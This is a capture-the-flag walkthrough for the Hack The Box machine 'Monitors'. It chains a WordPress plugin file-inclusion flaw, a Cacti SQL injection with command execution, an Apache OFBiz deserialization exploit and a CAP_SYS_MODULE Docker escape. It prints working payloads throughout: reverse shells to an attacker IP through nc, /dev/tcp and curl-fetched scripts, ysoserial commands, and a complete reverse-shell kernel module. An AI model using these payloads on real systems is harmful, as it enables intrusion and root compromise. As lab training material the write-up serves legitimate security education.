@@ -1,0 +1,315 @@
+Monitors
+
+ 4th October 2021 / Document No D21.100.135
+ Prepared By: TheCyberGeek
+ Machine Author(s): TheCyberGeek
+ Difficulty: Hard
+ Classification: Official
+Synopsis
+
+Monitors is a hard Linux machine that involves WordPress plugin exploitation leading to a command
+injection via SQL injection through a well known network management web application in order to get
+a shell on the system. Then by performing basic service file enumeration one can gain the user password
+and thus a foothold to the system through SSH. The root stage consists of a Java based XML RPC
+deserialization attack against Apache OFBiz to gain a shell in a Docker container. Then it is possible by
+abusing the CAP_SYS_MODULE capability to load a malicious kernel module against the host and escalate
+privileges to root.
+
+Skills Required
+
+      Linux Enumeration
+      Web Enumeration
+      Docker Enumeration
+      Troubleshooting
+
+Skills Learned
+
+      Local File Inclusion
+      Abusing MySQL Misconfigurations
+      Exploit modification
+      Java Deserialization
+      CAP_SYS_MODULE Docker Capability
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.238 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.238
+
+Nmap reveals that OpenSSH and Apache are listening on their default ports.
+
+Apache
+
+Browsing to port 80, a message is displayed that direct IP access is not allowed.
+   Sorry, direct IP access is not allowed.
+   If you are having issues accessing the site then contact the website administrator:
+   admin@monitors.htb
+We add the disclosed virtual host to our /etc/hosts file and navigate to http://monitors.htb.
+   echo "10.10.10.238 monitors.htb" | sudo tee -a /etc/hosts
+
+WordPress
+
+On the footer of the website we can see that the website is hosted through WordPress. Using wpscan we
+perform enumeration of the web application and check for the vulnerable plugins.
+
+   wpscan --url http://monitors.htb
+Navigating to the readme.txt of the plugin we spot a version number.
+   http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
+
+Searching on https://google.com for a vulnerability disclosure we find a proof of concept code on Exploit-
+DB.
+   1. Version Disclosure
+
+   /wp-content/plugins/wp-with-spritz/readme.txt
+
+   2. Source Code
+
+   if(isset($_GET['url'])){
+   $content=file_get_contents($_GET['url']);
+
+   3. Proof of Concept
+
+   /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=/../../../..//etc/passwd
+   /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=http(s)://domain/exec
+
+By utilising the proof of concept and navigating to the passwd file we verify that we have LFI against the
+target host.
+
+   http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=/../../../../etc/passwd
+Enumerating the file system also shows that there is a default Apache virtual host configuration file, the
+default name is 000-default.conf as mentioned here.
+
+   http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=/../../../../etc/apache2/sites-enabled/000-default.conf
+
+The comments of the virtual host file disclose the configuration file names of both monitors.htb and a
+secondary configuration file for cacti-admin.monitors.htb . Browsing to the monitors.htb.conf
+configuration file we find the default WordPress installation.
+
+   http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=/../../../../etc/apache2/sites-enabled/monitors.htb.conf
+Searching for the default configuration file of WordPress leads us to this link.
+
+   One of the most important files in your WordPress installation is the wp-config.php
+   file. This file is located in the root of your WordPress file directory and contains
+   your website's base configuration details, such as database connection information.
+
+Since we now know the location of the configuration file through the virtual host and the directory where
+the WordPress installation is stored we can visit the wp-config file and see a new set of credentials
+disclosed.
+
+   http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=/../../../../var/www/wordpress/wp-config.php
+Attempting to authenticate to the WordPress login fails with both wpadmin:BestAdministrator@2020!
+and admin:BestAdministrator@2020! . Going back to the virtual host configuration files we notice the
+cacti-admin.monitors.htb subdomain.
+
+Cacti
+
+   http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?
+   url=/../../../../etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
+We add the cacti-admin subdomain to our hosts file.
+
+   10.10.10.238 monitors.htb cacti-admin.monitors.htb
+
+When navigating to the cacti-admin subdomain we are presented with a login page which discloses the
+version number.
+Testing authentication we are able to authenticate with the username of admin and the previously found
+password BestAdministrator@2020! .
+
+In order to access the vulnerable section of the site we visit Presets and choose Colors which will bring
+us to a color selection/filter section of the site.
+
+By capturing the request in BurpSuite when exporting a specific color via the search bar, we are presented
+with the GET request utilised by the proof of concept which we must append the filter parameter and
+payload to.
+
+   &filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set
+   +value='ping+-c+3+10.10.14.83;'+where+name='path_php_binary';--+-
+Before triggering the remote code execution we start a tcpdump to capture ICMP requests. In order to
+trigger the command execution we must navigate to /cacti/host.php?action=reindex which will load
+the vulnerable code into memory and execute.
+
+Once we have triggered the remote code execution we check our terminal to see if we received any ICMP
+requests on tcpdump .
+
+   tcpdump -i tun0 icmp
+Since we know now that we can trigger remote code execution, we apply a new payload to gain a shell on
+the target host. We start a netcat listener locally.
+
+   nc -lvvp 4444
+Then we edit the command to gain remote code execution on the target host.
+
+   GET /cacti/color.php?
+   action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+use
+   r_auth;update+settings+set+value='rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-
+   i+2>%261|nc+10.10.14.83+4444+>/tmp/f;'+where+name='path_php_binary';--+-
+
+When visiting /cacti/host.php?action=reindex we notice that our payload is not being triggered but
+tcpdump is getting hit with three more ICMP requests, there seems to be some on site caching taking place
+so we log out, log back in, replace the cookie in BurpSuite with our new cookie, fire the payload again then
+visit /cacti/host.php?action=reindex .
+Privilege Escalation to Marcus
+
+After upgrading our shell to PTY, we begin enumerating the filesystem to see if we can identify any potential
+privilege escalation possibilities and after some enumeration an irregular service file is discovered which
+points to a script /home/marcus/.backup/backup.sh and it allows www-data user to start the service.
+
+Reading the contents of /home/marcus/.backup/backup.sh discloses Marcus password of
+VerticalEdge2020 .
+
+Now we can SSH to marcus@monitors.htb and obtain the user flag.
+Privilege Escalation to root
+
+While performing enumeration on the target we identified a web application listening internally on port
+8443 .
+
+We exit the current SSH session and forward the port locally since port 8443 is listening internally on the
+target host.
+
+   ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
+
+Browsing to the website on https://127.0.0.1:8443 we are presented with a 404 page.
+Apache OFBiz
+
+Performing directory enumeration returns results.
+
+By navigating to /content we are presented with a landing page for Apache OFBiz.
+Since the version is presented on the login page, we perform some research on Apache OFBiz 17.12.01 and
+find CVE-2020-9496 which allows us to exploit the vulnerable service through a XML RPC Java deserialization
+attack. The proof of concept code can be found here. To exploit the vulnerability we need to make a POST
+request to /webtools/control/xmlrpc and attach a base64 payload to the serializable entity within the
+XML in the request.
+
+   POST /webtools/control/xmlrpc HTTP/1.1
+   Host: your-ip
+   Content-Type: application/xml
+   Content-Length: 4093
+
+   <?xml version="1.0"?>
+   <methodCall>
+
+      <methodName>ProjectDiscovery</methodName>
+      <params>
+
+          <param>
+              <value>
+                 <struct>
+                     <member>
+                         <name>test</name>
+                         <value>
+                            <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
+
+   [base64-payload]</serializable>
+                         </value>
+
+                     </member>
+                 </struct>
+              </value>
+          </param>
+      </params>
+   </methodCall>
+In order to exploit the target now we need to download ysoserial.jar which allows us to generate a payload
+utilising the CommonBeanutils1 Java libraries for deserialization and then we need to base64 encode the
+output. We compose three seperate payloads to execute against the host.
+
+   java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 "curl 10.10.14.83/bash.sh -o
+   /tmp/bash.sh" | base64 | tr -d "\n"
+First we create a file called bash.sh with the following contents.
+   #!/bin/bash
+   bash -i >& /dev/tcp/10.10.14.83/4444 0>&1
+Initially we start a Python3 HTTP server and take the first base64 payload we just generated, and send it
+through a POST request to the vulnerable endpoint.
+   python3 -m http.server
+
+Even though we get an error response, we check our HTTP server and we notice that our payload has been
+collected and stored on the target.
+
+Then we need to create a new ysoserial payload to send that applies permissions to the newly uploaded
+file. We edit the base64 content of the POST request and send it to the target server.
+   java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 "chmod 777 /tmp/bash.sh" |
+   base64 | tr -d "\n
+An error response is displayed again which is fine. Now we repeat the previous step with a new ysoserial
+payload to execute the file.
+   java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 "bash -c /tmp/bash.sh" |
+   base64 | tr -d "\n"
+Finally we start a netcat listener and send that to the target server.
+   nc -lvvp 4444
+
+Docker Escape via CAP_SYS_MODULE
+
+By enumerating the filesystem we notice that the Docker instance had specific capabilities applied to the
+system.
+The most interesting capability that has been granted to the Docker is the CAP_SYS_MODULE which allows
+the root user of the docker to update and install new kernel modules against the Docker host. In order to
+exploit the host machine, we need to create a malicious kernel module in the container to apply to the host
+as according to this link. Next we need to create a module to execute against the host and save it to
+reverse-shell.c .
+
+   #include <linux/kmod.h>
+   #include <linux/module.h>
+
+   MODULE_LICENSE("GPL");
+   MODULE_AUTHOR("AttackDefense");
+   MODULE_DESCRIPTION("LKM reverse shell module");
+   MODULE_VERSION("1.0");
+
+   char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.83/4444 0>&1", NULL};
+   static char* envp[] =
+   {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+   static int __init reverse_shell_init(void) {
+
+      return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+   }
+   static void __exit reverse_shell_exit(void) {
+
+      printk(KERN_INFO "Exiting\n");
+   }
+   module_init(reverse_shell_init);
+   module_exit(reverse_shell_exit);
+The above kernel module takes the necessary kernel imports, assigns a description to the module and
+forms a command to execute against the target. This command returns a shell to our desired IP address
+and port and then sets the PATH variable so that we have access to the necessary applications when the
+shell will spawn. Finally it creates the function to execute when the module is initialised on the host and
+exits. In order for this to be successful we must find out the current kernel version of the system and
+docker.
+
+So after we have identified the version to be 4.15.0-151-generic , we check to see if the necessary kernel
+libraries exist on the system.
+
+As we now know that there are existing libraries on the machine to compile, we can issue a custom kernel
+update using the existing module on the docker host. We create a Makefile specifying the path to the
+latest kernel version in the /lib/modules directory.
+
+   obj-m +=reverse-shell.o
+   all:
+
+              make -C /lib/modules/4.15.0-151-generic/build M=$(shell pwd) modules
+   clean:
+
+              make -C /lib/modules/4.15.0-151-generic/build M=$(shell pwd) clean
+Now that we have everything in place to compile the kernel module we simply type make .
+When running make we encounter an issue stating that scripts/basic/fixdep does not exist. So we
+search the system for existing fixdep binaries.
+
+We have located a valid fixdep binary in the same headers directory so we observe that there is no
+fixdep in the location where the Makefile is looking for and thus we create the directories and copy the
+fixdep binary to that folder.
+
+We run make again.
+This time we confirm we have the newly generated reverse-shell.ko file. We start a local netcat
+listener.
+
+   nc -lvvp 4444
+
+Then we load the updated module to the kernel using insmod on the Docker and applying the new
+reverse-shell.ko module to the host.
+
+   insmod reverse-shell.ko
+
+By checking our listener we finally get a reversed spawned shell as user root on the host system.
+
